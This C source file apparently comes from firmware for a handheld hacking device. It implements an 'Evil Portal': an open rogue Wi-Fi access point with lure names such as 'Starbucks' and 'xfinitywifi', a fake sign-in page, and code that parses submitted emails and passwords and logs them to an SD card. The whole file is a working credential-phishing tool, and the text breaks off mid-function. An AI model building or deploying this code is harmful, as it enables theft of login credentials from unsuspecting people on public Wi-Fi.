/* See COPYING.txt for license details. */

/*
*
* app_evil_portal.c
*
* Evil Portal: captive portal credential harvester.
*
* Stands up a soft-AP on the ESP32-C6 (open network), runs an HTTP server
* on port 80 via AT commands, intercepts every request, serves a
* credential-harvest login page and parses the POSTed username/password
* into /WiFi/portal_creds.txt.
*
* All TCP/IP work is delegated to the ESP32-C6 via the `AT+CIPxxx` family
* of commands, accessed through `spi_AT_send_recv()`.  No local TCP stack
* is required on the STM32.
*
* M1 Project
*
*/

/*************************** I N C L U D E S **********************************/

#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>

#include "stm32h5xx_hal.h"
#include "main.h"
#include "app_evil_portal.h"
#include "m1_compile_cfg.h"
#include "m1_display.h"
#include "m1_lcd.h"
#include "m1_system.h"
#include "m1_tasks.h"
#include "m1_esp32_hal.h"
#include "esp_app_main.h"
#include "ctrl_api.h"
#include "ff.h"

#ifdef M1_APP_EVIL_PORTAL_ENABLE

/*************************** D E F I N E S ************************************/

#define M1_EP_LOGDB_TAG          "EvilPortal"

#define EP_SSID_MAX_LEN          24
#define EP_SSID_DEFAULT          "FreeWifi"
#define EP_PRESET_COUNT          5
#define EP_CHANNEL_DEFAULT       6

#define EP_AT_BUF_SIZE           4096   /* Was 1024; bumped for >900B POSTs and IPD blobs */
#define EP_HTTP_REQ_MAX          3072   /* Bumped to match AT buf */
#define EP_FIELD_MAX             96

#define EP_MAX_CRED_LOG          16
#define EP_LOG_VISIBLE_ROWS      4

#define EP_CRED_FILE_DIR         "0:/WiFi"
#define EP_CRED_FILE_PATH        "0:/WiFi/portal_creds.txt"

#define EP_POLL_INTERVAL_MS      150U
#define EP_AT_TIMEOUT_SHORT      2
#define EP_AT_TIMEOUT_LONG       5

/*************************** S T R U C T U R E S *****************************/

typedef struct {
    char     email[EP_FIELD_MAX];
    char     password[EP_FIELD_MAX];
} ep_cred_t;

/***************************** V A R I A B L E S ******************************/

static const char *s_ep_presets[EP_PRESET_COUNT] = {
    "FreeWifi",
    "Airport_WiFi",
    "Hotel_Guest",
    "Starbucks",
    "xfinitywifi"
};

static char s_ep_ssid[EP_SSID_MAX_LEN + 1];
static uint8_t s_ep_channel = EP_CHANNEL_DEFAULT;

static char s_ep_at_buf[EP_AT_BUF_SIZE];
static char s_ep_http_buf[EP_HTTP_REQ_MAX];

static ep_cred_t s_ep_creds[EP_MAX_CRED_LOG];
static uint16_t  s_ep_cred_count;
static uint16_t  s_ep_total_creds;     /* total captured (may exceed log size) */
static uint16_t  s_ep_client_count;

/* The HTML body served for any GET request - a generic captive portal login. */
static const char EP_HTML_PORTAL[] =
    "<!DOCTYPE html><html><head><title>WiFi Login</title>"
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
    "<style>body{font-family:Arial;max-width:400px;margin:50px auto;padding:20px}"
    "input{width:100%;padding:10px;margin:10px 0;box-sizing:border-box}"
    "button{width:100%;padding:10px;background:#0066cc;color:white;border:none;cursor:pointer}</style>"
    "</head><body>"
    "<h2>Network Login Required</h2>"
    "<p>Please sign in to continue using the network.</p>"
    "<form method=\"POST\" action=\"/login\">"
    "<input type=\"text\" name=\"email\" placeholder=\"Email Address\" required>"
    "<input type=\"password\" name=\"password\" placeholder=\"Password\" required>"
    "<button type=\"submit\">Sign In</button>"
    "</form></body></html>";

/* Body for the POST /login response - claims success and "redirects" away. */
static const char EP_HTML_THANKS[] =
    "<!DOCTYPE html><html><head><title>Connecting...</title>"
    "<meta http-equiv=\"refresh\" content=\"3;url=http://8.8.8.8/\">"
    "<style>body{font-family:Arial;max-width:400px;margin:80px auto;padding:20px;text-align:center}</style>"
    "</head><body>"
    "<h2>Thank you!</h2>"
    "<p>You are being connected to the internet.</p>"
    "</body></html>";

/********************* F U N C T I O N   P R O T O T Y P E S ******************/

static bool ep_select_ssid(void);
static bool ep_select_channel(void);
static bool ep_start_ap(void);
static void ep_stop_ap(void);
static void ep_run_loop(void);
static void ep_draw_running(uint8_t scroll, bool show_log);
static void ep_poll_clients(void);
static int  ep_find_ipd(const char *buf, int *conn_id, int *length, int *header_len);
static void ep_handle_request(int conn_id, const char *data, int data_len);
static bool ep_send_response(int conn_id, const char *status_line,
                             const char *body, int body_len);
static void ep_close_connection(int conn_id);
static void ep_url_decode(const char *src, int src_len, char *dst, int dst_size);
static bool ep_save_cred(const ep_cred_t *cred);
static void ep_display_msg(const char *line1, const char *line2);
static int  ep_btoi_http(const char *body, int body_len, char *out_email,
                         int email_size, char *out_pw, int pw_size);

/*============================================================================*/
/**
  * @brief Display two-line status panel
  */
/*============================================================================*/
static void ep_display_msg(const char *line1, const char *line2)
{
    m1_u8g2_firstpage();
    m1_draw_status_panel(&m1_u8g2, "Evil Portal", NULL, NULL, 0, 0,
                         line1, line2, NULL);
    m1_u8g2_nextpage();
}

/*============================================================================*/
/**
  * @brief URL-decode a slice of POST body into a destination buffer.
  *
  * Replaces '+' with space and decodes %XX hex escapes.  Output is
  * always NUL-terminated.
  */
/*============================================================================*/
static void ep_url_decode(const char *src, int src_len, char *dst, int dst_size)
{
    int i = 0;
    int j = 0;

    if (dst_size <= 0) return;

    while (i < src_len && j < dst_size - 1)
    {
        char c = src[i];
        if (c == '+')
        {
            dst[j++] = ' ';
            i++;
        }
        else if (c == '%' && (i + 2) < src_len)
        {
            char h1 = src[i + 1];
            char h2 = src[i + 2];
            int v1 = (h1 >= '0' && h1 <= '9') ? (h1 - '0')
                   : (h1 >= 'a' && h1 <= 'f') ? (h1 - 'a' + 10)
                   : (h1 >= 'A' && h1 <= 'F') ? (h1 - 'A' + 10) : -1;
            int v2 = (h2 >= '0' && h2 <= '9') ? (h2 - '0')
                   : (h2 >= 'a' && h2 <= 'f') ? (h2 - 'a' + 10)
                   : (h2 >= 'A' && h2 <= 'F') ? (h2 - 'A' + 10) : -1;
            if (v1 >= 0 && v2 >= 0)
            {
                dst[j++] = (char)((v1 << 4) | v2);
                i += 3;
            }
            else
            {
                dst[j++] = c;
                i++;
            }
        }
        else
        {
            dst[j++] = c;
            i++;
        }
    }
    dst[j] = '\0';
}

/*============================================================================*/
/**
  * @brief Pull `email` and `password` fields out of an x-www-form-urlencoded
  *        POST body.
  *
  * @return number of fields successfully parsed (0..2).
  */
/*============================================================================*/
static int ep_btoi_http(const char *body, int body_len, char *out_email,
                        int email_size, char *out_pw, int pw_size)
{
    int parsed = 0;
    const char *p = body;
    const char *end = body + body_len;

    out_email[0] = '\0';
    out_pw[0] = '\0';

    while (p < end)
    {
        const char *eq = NULL;
        const char *amp = NULL;
        const char *q = p;

        while (q < end && *q != '=' && *q != '&') q++;
        if (q >= end || *q != '=') break;
        eq = q;

        amp = eq + 1;
        while (amp < end && *amp != '&') amp++;

        int klen = (int)(eq - p);
        const char *val = eq + 1;
        int vlen = (int)(amp - val);

        if (klen == 5 && strncmp(p, "email", 5) == 0)
        {
            ep_url_decode(val, vlen, out_email, email_size);
            parsed++;
        }
        else if (klen == 8 && strncmp(p, "password", 8) == 0)
        {
            ep_url_decode(val, vlen, out_pw, pw_size);
            parsed++;
        }

        if (amp >= end) break;
        p = amp + 1;
    }

    return parsed;
}

/*============================================================================*/
/**
  * @brief Append a captured credential to the SD card log.
  */
/*============================================================================*/
static bool ep_save_cred(const ep_cred_t *cred)
{
    FIL file;
    UINT bw;
    FRESULT fres;
    m1_time_t now;
    char line[160];

    f_mkdir(EP_CRED_FILE_DIR);

    fres = f_open(&file, EP_CRED_FILE_PATH, FA_WRITE | FA_OPEN_APPEND);
    if (fres != FR_OK)
    {
        /* Try CREATE if APPEND failed because file does not exist */
        fres = f_open(&file, EP_CRED_FILE_PATH, FA_WRITE | FA_CREATE_ALWAYS);
        if (fres != FR_OK)
            return false;
    }

    m1_get_localtime(&now);
    snprintf(line, sizeof(line),
             "[%04u-%02u-%02u %02u:%02u] %s:%s\r\n",
             (unsigned)now.year, (unsigned)now.month, (unsigned)now.day,
             (unsigned)now.hour, (unsigned)now.minute,
             cred->email[0]    ? cred->email    : "(blank)",
             cred->password[0] ? cred->password : "(blank)");

    fres = f_write(&file, line, strlen(line), &bw);
    f_sync(&file);
    f_close(&file);
    return (fres == FR_OK);
}

/*============================================================================*/
/**
  * @brief Letter cycle helper for the SSID virtual-keyboard prompt.
  *
  * Cycles through: A-Z, a-z, 0-9, '_'.  Used when arrow keys edit a
  * character at the current cursor.
  */
/*============================================================================*/
static char ep_cycle_char(char c, int8_t direction)
{
    static const char alphabet[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789_";
    int n = (int)(sizeof(alphabet) - 1);
    int i;

    for (i = 0; i < n; i++)
        if (alphabet[i] == c) break;
    if (i >= n) i = 0;

    i = (i + direction + n) % n;
    return alphabet[i];
}

/*============================================================================*/
/**
  * @brief SSID + preset selection screen.
  *
  * UP/DOWN scrolls preset list, RIGHT enters character editor on the
  * highlighted preset, OK accepts, BACK cancels.  Returns true on accept.
  */
/*============================================================================*/
static bool ep_select_ssid(void)
{
    S_M1_Buttons_Status btn;
    S_M1_Main_Q_t q_item;
    BaseType_t ret;
    uint8_t sel = 0;
    bool editing = false;
    uint8_t cur = 0;
    char ssid[EP_SSID_MAX_LEN + 1];

    strncpy(ssid, EP_SSID_DEFAULT, EP_SSID_MAX_LEN);
    ssid[EP_SSID_MAX_LEN] = '\0';

    u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);

    for (;;)
    {
        m1_u8g2_firstpage();
        m1_draw_header_bar(&m1_u8g2, "Evil Portal", editing ? "Edit" : "SSID");
        m1_draw_content_frame(&m1_u8g2, 2, 14, 124, 35);
        u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);

        if (editing)
        {
            char display[EP_SSID_MAX_LEN + 4];
            char marker[EP_SSID_MAX_LEN + 4];
            uint8_t mark_pos;

            snprintf(display, sizeof(display), "[%s]", ssid);
            m1_draw_text(&m1_u8g2, 6, 26, 116, "Edit SSID:", TEXT_ALIGN_LEFT);
            m1_draw_text(&m1_u8g2, 6, 36, 116, display, TEXT_ALIGN_LEFT);

            /* Build a cursor underline aligned with the displayed string. */
            memset(marker, ' ', sizeof(marker));
            mark_pos = (uint8_t)((cur < strlen(ssid)) ? cur : strlen(ssid));
            mark_pos = (uint8_t)(mark_pos + 1U); /* account for '[' */
            if (mark_pos < sizeof(marker) - 1)
                marker[mark_pos] = '^';
            marker[sizeof(marker) - 1] = '\0';
            m1_draw_text(&m1_u8g2, 6, 44, 116, marker, TEXT_ALIGN_LEFT);

            m1_draw_bottom_bar(&m1_u8g2, arrowleft_8x8, "Back", "OK", arrowright_8x8);
        }
        else
        {
            char line1[40];
            const char *preset = (sel < EP_PRESET_COUNT)
                                 ? s_ep_presets[sel]
                                 : ssid;
            snprintf(line1, sizeof(line1), "Preset %u/%u:",
                     (unsigned)(sel + 1), (unsigned)EP_PRESET_COUNT);
            m1_draw_text(&m1_u8g2, 6, 24, 116, line1, TEXT_ALIGN_LEFT);
            m1_draw_text(&m1_u8g2, 6, 34, 116, preset, TEXT_ALIGN_LEFT);
            m1_draw_text(&m1_u8g2, 6, 44, 116, "OK=use, RIGHT=edit", TEXT_ALIGN_LEFT);
            m1_draw_bottom_bar(&m1_u8g2, arrowleft_8x8, "Back", "OK", arrowright_8x8);
        }
        m1_u8g2_nextpage();

        ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
        if (ret != pdTRUE || q_item.q_evt_type != Q_EVENT_KEYPAD) continue;
        xQueueReceive(button_events_q_hdl, &btn, 0);

        if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
        {
            if (editing) { editing = false; continue; }
            xQueueReset(main_q_hdl);
            return false;
        }

        if (!editing)
        {
            if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
            {
                sel = (sel == 0) ? (EP_PRESET_COUNT - 1) : (uint8_t)(sel - 1);
                strncpy(ssid, s_ep_presets[sel], EP_SSID_MAX_LEN);
                ssid[EP_SSID_MAX_LEN] = '\0';
            }
            else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
            {
                sel = (uint8_t)((sel + 1U) % EP_PRESET_COUNT);
                strncpy(ssid, s_ep_presets[sel], EP_SSID_MAX_LEN);
                ssid[EP_SSID_MAX_LEN] = '\0';
            }
            else if (btn.event[BUTTON_RIGHT_KP_ID] == BUTTON_EVENT_CLICK)
            {
                editing = true;
                cur = 0;
            }
            else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
            {
                strncpy(s_ep_ssid, ssid, EP_SSID_MAX_LEN);
                s_ep_ssid[EP_SSID_MAX_LEN] = '\0';
                if (s_ep_ssid[0] == '\0')
                    strcpy(s_ep_ssid, EP_SSID_DEFAULT);
                xQueueReset(main_q_hdl);
                return true;
            }
        }
        else
        {
            uint8_t slen = (uint8_t)strlen(ssid);

            if (btn.event[BUTTON_LEFT_KP_ID] == BUTTON_EVENT_CLICK)
            {
                if (cur > 0) cur--;
            }
            else if (btn.event[BUTTON_RIGHT_KP_ID] == BUTTON_EVENT_CLICK)
            {
                if (cur < EP_SSID_MAX_LEN - 1)
                {
                    cur++;
                    if (cur >= slen)
                    {
                        ssid[cur] = 'A';
                        ssid[cur + 1] = '\0';
                    }
                }
            }
            else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
            {
                if (cur < slen)
                    ssid[cur] = ep_cycle_char(ssid[cur], +1);
            }
            else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
            {
                if (cur < slen)
                    ssid[cur] = ep_cycle_char(ssid[cur], -1);
            }
            else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
            {
                /* Trim trailing 'A' placeholders introduced by RIGHT */
                while (slen > 1 && ssid[slen - 1] == 'A')
                {
                    ssid[slen - 1] = '\0';
                    slen--;
                }
                editing = false;
            }
        }
    }
}

/*============================================================================*/
/**
  * @brief Channel selection screen (1..11).
  *
  * UP/DOWN cycles channel, OK confirms, BACK cancels.
  */
/*============================================================================*/
static bool ep_select_channel(void)
{
    S_M1_Buttons_Status btn;
    S_M1_Main_Q_t q_item;
    BaseType_t ret;

    if (s_ep_channel < 1 || s_ep_channel > 11)
        s_ep_channel = EP_CHANNEL_DEFAULT;

    u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);

    for (;;)
    {
        char line[24];

        m1_u8g2_firstpage();
        m1_draw_header_bar(&m1_u8g2, "Evil Portal", "Channel");
        m1_draw_content_frame(&m1_u8g2, 2, 14, 124, 35);
        u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);

        snprintf(line, sizeof(line), "SSID: %.18s", s_ep_ssid);
        m1_draw_text(&m1_u8g2, 6, 24, 116, line, TEXT_ALIGN_LEFT);
        snprintf(line, sizeof(line), "Channel: %u", (unsigned)s_ep_channel);
        m1_draw_text(&m1_u8g2, 6, 34, 116, line, TEXT_ALIGN_LEFT);
        m1_draw_text(&m1_u8g2, 6, 44, 116, "UP/DN to change", TEXT_ALIGN_LEFT);
        m1_draw_bottom_bar(&m1_u8g2, arrowleft_8x8, "Back", "Launch", arrowright_8x8);
        m1_u8g2_nextpage();

        ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
        if (ret != pdTRUE || q_item.q_evt_type != Q_EVENT_KEYPAD) continue;
        xQueueReceive(button_events_q_hdl, &btn, 0);

        if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
        {
            xQueueReset(main_q_hdl);
            return false;
        }
        else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
        {
            s_ep_channel = (s_ep_channel >= 11) ? 1U : (uint8_t)(s_ep_channel + 1U);
        }
        else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
        {
            s_ep_channel = (s_ep_channel <= 1) ? 11U : (uint8_t)(s_ep_channel - 1U);
        }
        else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
        {
            xQueueReset(main_q_hdl);
            return true;
        }
    }
}

/*============================================================================*/
/**
  * @brief Bring up the soft-AP and TCP server on the ESP32-C6.
  */
/*============================================================================*/
static bool ep_start_ap(void)
{
    char cmd[128];
    bool ok = true;

    /* Drop any existing connections / server */
    spi_AT_send_recv("AT+CIPSERVER=0\r\n", s_ep_at_buf, sizeof(s_ep_at_buf), EP_AT_TIMEOUT_SHORT);
    osDelay(100);

    /* Mode 2 = SoftAP, mode 3 = STA+SoftAP.  Use 2 to keep the air clean. */
    if (spi_AT_send_recv("AT+CWMODE=2\r\n", s_ep_at_buf,
                         sizeof(s_ep_at_buf), EP_AT_TIMEOUT_SHORT) != SUCCESS)
        ok = false;
    if (!strstr(s_ep_at_buf, "OK")) ok = false;

    /* Configure the AP: open network, channel from menu, max conns 4 */
    snprintf(cmd, sizeof(cmd),
             "AT+CWSAP=\"%s\",\"\",%u,0,4,0\r\n",
             s_ep_ssid, (unsigned)s_ep_channel);
    if (spi_AT_send_recv(cmd, s_ep_at_buf, sizeof(s_ep_at_buf),
                         EP_AT_TIMEOUT_LONG) != SUCCESS)
        ok = false;
    if (!strstr(s_ep_at_buf, "OK")) ok = false;

    /* Enable DHCP server for the AP */
    spi_AT_send_recv("AT+CWDHCP=1,2\r\n", s_ep_at_buf,
                     sizeof(s_ep_at_buf), EP_AT_TIMEOUT_SHORT);

    /* Set AP IP block to the conventional 192.168.4.1/24 (most ESP32 default) */
    spi_AT_send_recv("AT+CIPAP=\"192.168.4.1\",\"192.168.4.1\",\"255.255.255.0\"\r\n",
                     s_ep_at_buf, sizeof(s_ep_at_buf), EP_AT_TIMEOUT_SHORT);

    /* Multi-connection, then HTTP server */
    if (spi_AT_send_recv("AT+CIPMUX=1\r\n", s_ep_at_buf,
                         sizeof(s_ep_at_buf), EP_AT_TIMEOUT_SHORT) != SUCCESS)
        ok = false;

    if (spi_AT_send_recv("AT+CIPSERVER=1,80\r\n", s_ep_at_buf,
                         sizeof(s_ep_at_buf), EP_AT_TIMEOUT_SHORT) != SUCCESS)
        ok = false;

    /* 30s recv inactivity timeout for stuck mobile browsers */
    spi_AT_send_recv("AT+CIPSTO=30\r\n", s_ep_at_buf,
                     sizeof(s_ep_at_buf), EP_AT_TIMEOUT_SHORT);

    return ok;
}

/*============================================================================*/
/**
  * @brief Tear down the soft-AP and TCP server.
  */
/*============================================================================*/
static void ep_stop_ap(void)
{
    spi_AT_send_recv("AT+CIPSERVER=0\r\n", s_ep_at_buf,
                     sizeof(s_ep_at_buf), EP_AT_TIMEOUT_SHORT);
    osDelay(50);
    spi_AT_send_recv("AT+CIPMUX=0\r\n", s_ep_at_buf,
                     sizeof(s_ep_at_buf), EP_AT_TIMEOUT_SHORT);
    spi_AT_send_recv("AT+CWMODE=1\r\n", s_ep_at_buf,
                     sizeof(s_ep_at_buf), EP_AT_TIMEOUT_SHORT);
}

/*============================================================================*/
/**
  * @brief Render the live "portal running" screen.
  */
/*============================================================================*/
static void ep_draw_running(uint8_t scroll, bool show_log)
{
    char l1[28], l2[28];

    snprintf(l1, sizeof(l1), "%.16s ch%u", s_ep_ssid, (unsigned)s_ep_channel);
    snprintf(l2, sizeof(l2), "Cli:%u  Cap:%u",
             (unsigned)s_ep_client_count, (unsigned)s_ep_total_creds);

    m1_u8g2_firstpage();
    u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
    m1_draw_header_bar(&m1_u8g2, "EVIL PORTAL", "LIVE");
    u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);

    m1_draw_text(&m1_u8g2, 4, 22, 120, l1, TEXT_ALIGN_LEFT);
    m1_draw_text(&m1_u8g2, 4, 30, 120, l2, TEXT_ALIGN_LEFT);

    if (show_log && s_ep_cred_count > 0)
    {
        uint16_t base = scroll;
        uint16_t i;
        if (base >= s_ep_cred_count) base = 0;

        for (i = 0; i < EP_LOG_VISIBLE_ROWS && (base + i) < s_ep_cred_count; i++)
        {
            char row[32];
            const ep_cred_t *c = &s_ep_creds[base + i];
            snprintf(row, sizeof(row), "%.10s:%.10s",
                     c->email[0]    ? c->email    : "-",
                     c->password[0] ? c->password : "-");
            m1_draw_text(&m1_u8g2, 4, 38 + i * 7, 120, row, TEXT_ALIGN_LEFT);
        }
    }
    else
    {
        m1_draw_text(&m1_u8g2, 4, 42, 120, "Awaiting clients...",
                     TEXT_ALIGN_LEFT);
    }
    m1_draw_bottom_bar(&m1_u8g2, arrowleft_8x8, "Stop", NULL, NULL);
    m1_u8g2_nextpage();
}

/*============================================================================*/
/**
  * @brief Locate a `+IPD,n,len:` payload header in `buf`, returning the
  *        start offset of the data, the connection id, and the payload
  *        length.  Returns -1 if not found.
  */
/*============================================================================*/
static int ep_find_ipd(const char *buf, int *conn_id, int *length, int *header_len)
{
    const char *p = strstr(buf, "+IPD,");
    if (!p) return -1;

    int cid = -1, len = -1;
    const char *colon = strchr(p, ':');
    if (!colon) return -1;

    /* parse "+IPD,<cid>,<len>" or "+IPD,<cid>,<len>,<remote_ip>,<port>" */
    if (sscanf(p, "+IPD,%d,%d", &cid, &len) != 2)
        return -1;

    if (cid < 0 || len <= 0) return -1;

    *conn_id = cid;
    *length  = len;
    *header_len = (int)((colon + 1) - buf);
    return (int)(p - buf);
}

/*============================================================================*/
/**
  * @brief Send an HTTP/1.1 response over the given AT connection id.
  *
  * Implements the proper ESP-AT CIPSEND state machine:
  *   1. Send "AT+CIPSEND=<id>,<len>\r\n", expect "OK\r\n>" prompt.
  *   2. Stream the raw payload bytes (NO \r\n framing).
  *   3. Wait for "SEND OK" (success) or "SEND FAIL"/"link is not valid".
  *
  * The previous single spi_AT_send_recv path violated all three steps:
  * it sent header+body as one AT command (which the AT layer then
  * appended \r\n to, corrupting the body) and treated either OK or
  * SEND OK as success even when the payload write itself failed.
  */
/*============================================================================*/
static bool ep_send_response(int conn_id, const char *status_line,
                             const char *body, int body_len)
{
    char hdr[192];
    int hlen;
    char cmd[64];
    int total;
    static char send_buf[EP_AT_BUF_SIZE];

    if (body_len <= 0) body_len = (int)strlen(body);

    hlen = snprintf(hdr, sizeof(hdr),
                    "HTTP/1.1 %s\r\n"
                    "Content-Type: text/html; charset=UTF-8\r\n"
                    "Content-Length: %d\r\n"
                    "Cache-Control: no-store\r\n"
                    "Connection: close\r\n\r\n",
                    status_line, body_len);

    total = hlen + body_len;
    if (total >= (int)sizeof(send_buf)) total = (int)sizeof(send_buf) - 1;

    /* Step 1: announce send length. Slave responds OK\r\n then ">". */
    snprintf(cmd, sizeof(cmd), "AT+CIPSEND=%d,%d\r\n", conn_id, total);
    if (spi_AT_send_recv(cmd, s_ep_at_buf, sizeof(s_ep_at_buf),
                         EP_AT_TIMEOUT_SHORT) != SUCCESS)
        return false;
    if (strstr(s_ep_at_buf, "ERROR") != NULL ||
        strstr(s_ep_at_buf, "link is not valid") != NULL)
        return false;

    /* Step 2: assemble raw payload (header + body) into send_buf. */
    {
        int copy = hlen;
        if (copy >= (int)sizeof(send_buf)) copy = (int)sizeof(send_buf) - 1;
        memcpy(send_buf, hdr, copy);
        int room = (int)sizeof(send_buf) - 1 - copy;
        if (room < 0) room = 0;
        int btake = (body_len < room) ? body_len : room;
        memcpy(send_buf + copy, body, btake);
        send_buf[copy + btake] = '\0';
    }

    /* Step 3: stream raw bytes; expect "SEND OK" terminator. */
    if (spi_AT_send_recv(send_buf, s_ep_at_buf, sizeof(s_ep_at_buf),
                         EP_AT_TIMEOUT_LONG) != SUCCESS)
        return false;

    if (strstr(s_ep_at_buf, "SEND OK") != NULL)
        return true;
    if (strstr(s_ep_at_buf, "SEND FAIL") != NULL ||
        strstr(s_ep_at_buf, "ERROR")     != NULL ||
        strstr(s_ep_at_buf, "FAIL")      != NULL)
        return false;
    return (strstr(s_ep_at_buf, "OK") != NULL);
}

/*============================================================================*/
/**
  * @brief Close a TCP connection.
  */
/*============================================================================*/
static void ep_close_connection(int conn_id)
{
    char cmd[32];
    snprintf(cmd, sizeof(cmd), "AT+CIPCLOSE=%d\r\n", conn_id);
    spi_AT_send_recv(cmd, s_ep_at_buf, sizeof(s_ep_at_buf), EP_AT_TIMEOUT_SHORT);
}

/*============================================================================*/
/**
  * @brief Parse a fully reassembled HTTP request payload and act on it.
  */
/*============================================================================*/
static void ep_handle_request(int conn_id, const char *data, int data_len)
{
    bool is_post_login = false;
    const char *body = NULL;
    int body_len = 0;

    /* Method and path */
    if (data_len < 4) { ep_close_connection(conn_id); return; }

    if (data_len > 11 && strncmp(data, "POST /login", 11) == 0)
    {
        is_post_login = true;
    }

    /* Find body */
    {
        const char *crlfcrlf = strstr(data, "\r\n\r\n");
        if (crlfcrlf)
        {
            body = crlfcrlf + 4;
            body_len = data_len - (int)(body - data);
            if (body_len < 0) body_len = 0;
        }
    }

    if (is_post_login && body && body_len > 0)
    {
        ep_cred_t cred;
        memset(&cred, 0, sizeof(cred));

        if (ep_btoi_http(body, body_len,
                         cred.email, sizeof(cred.email),
                         cred.password, sizeof(cred.password)) > 0)
        {
            /* Cache for on-screen log */
            if (s_ep_cred_count < EP_MAX_CRED_LOG)
            {
                memcpy(&s_ep_creds[s_ep_cred_count], &cred, sizeof(cred));
                s_ep_cred_count++;
            }
            else
            {
                /* shift down for ring behavior */
                memmove(&s_ep_creds[0], &s_ep_creds[1],
                        sizeof(ep_cred_t) * (EP_MAX_CRED_LOG - 1));
                memcpy(&s_ep_creds[EP_MAX_CRED_LOG - 1], &cred, sizeof(cred));
            }
            s_ep_total_creds++;

            ep_save_cred(&cred);
        }

        /* Serve "thank you" then close */
        ep_send_response(conn_id, "200 OK",
                         EP_HTML_THANKS, (int)(sizeof(EP_HTML_THANKS) - 1));
    }
    else
    {
        /* Any GET (or any other request) -> serve the harvest page */
        ep_send_response(conn_id, "200 OK",
                         EP_HTML_PORTAL, (int)(sizeof(EP_HTML_PORTAL) - 1));
    }

    ep_close_connection(conn_id);
}

/*============================================================================*/
/**
  * @brief Drain pending +IPD payloads and connected-station data from the
  *        ESP32 over the AT interface.
  *
  * Strategy: send a no-op AT command and parse whatever asynchronous data
  * arrived in the response buffer.  The ESP32 AT firmware embeds incoming
  * data as `+IPD,id,len:<bytes>` blobs and delivers connection notices as
  * `id,CONNECT` / `id,CLOSED` lines.
  */
/*============================================================================*/
static void ep_poll_clients(void)
{
    int ipd_off, conn_id, length, header_off;
    char *buf = s_ep_at_buf;

    /* Touch the AT layer.  AT alone is the canonical "are you there?". */
    if (spi_AT_send_recv("AT\r\n", buf, sizeof(s_ep_at_buf),
                         EP_AT_TIMEOUT_SHORT) != SUCCESS)
        return;

    /* Track simple client count by counting CONNECT/CLOSED notifications. */
    {
        const char *p = buf;
        while ((p = strstr(p, ",CONNECT")) != NULL)
        {
            if (s_ep_client_count < 0xFFFF) s_ep_client_count++;
            p += 8;
        }
        p = buf;
        while ((p = strstr(p, ",CLOSED")) != NULL)
        {
            if (s_ep_client_count > 0) s_ep_client_count--;
            p += 7;
        }
    }

    /* Walk every +IPD blob in the buffer */
    ipd_off = ep_find_ipd(buf, &conn_id, &length, &header_off);
    while (ipd_off >= 0)
    {
        int avail = (int)strlen(buf) - header_off;
        int take = (length < avail) ? length : avail;
        if (take > (int)sizeof(s_ep_http_buf) - 1)
            take = (int)sizeof(s_ep_http_buf) - 1;
        if (take < 0) take = 0;

        memcpy(s_ep_http_buf, buf + header_off, take);
        s_ep_http_buf[take] = '\0';

        ep_handle_request(conn_id, s_ep_http_buf, take);

        /* Move past the consumed payload */
        if (header_off + take >= (int)strlen(buf))
            break;
        memmove(buf, buf + header_off + take,
                strlen(buf + header_off + take) + 1);
        ipd_off = ep_find_ipd(buf, &conn_id, &length, &header_off);
    }
}

/*============================================================================*/
/**
  * @brief Live monitor + service loop.
  */
/*============================================================================*/
static void ep_run_loop(void)
{
    S_M1_Buttons_Status btn;
    S_M1_Main_Q_t q_item;
    uint8_t scroll = 0;
    TickType_t last_draw = 0;
    TickType_t last_poll = 0;

    s_ep_cred_count = 0;
    s_ep_total_creds = 0;
    s_ep_client_count = 0;

    ep_draw_running(scroll, true);

    for (;;)
    {
        TickType_t now = xTaskGetTickCount();

        if ((now - last_poll) >= pdMS_TO_TICKS(EP_POLL_INTERVAL_MS))
        {
            ep_poll_clients();
            last_poll = now;
        }

        if ((now - last_draw) >= pdMS_TO_TICKS(500U))
        {
            ep_draw_running(scroll, true);
            last_draw = now;
        }

        if (xQueueReceive(main_q_hdl, &q_item,
                          pdMS_TO_TICKS(EP_POLL_INTERVAL_MS)) == pdTRUE &&
            q_item.q_evt_type == Q_EVENT_KEYPAD &&
            xQueueReceive(button_events_q_hdl, &btn, 0) == pdTRUE)
        {
            if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
                return;
            if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK && scroll > 0)
                scroll--;
            if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK &&
                s_ep_cred_count > EP_LOG_VISIBLE_ROWS &&
                scroll < (s_ep_cred_count - EP_LOG_VISIBLE_ROWS))
                scroll++;
            ep_draw_running(scroll, true);
            last_draw = now;
        }
    }
}

/*============================================================================*/
/**
  * @brief Public entry point: orchestrates SSID picker, channel picker,
  *        AP launch, live loop and clean teardown.
  */
/*============================================================================*/
void app_evil_portal_run(void)
{
    /* Default SSID/channel for first run */
    if (s_ep_ssid[0] == '\0')
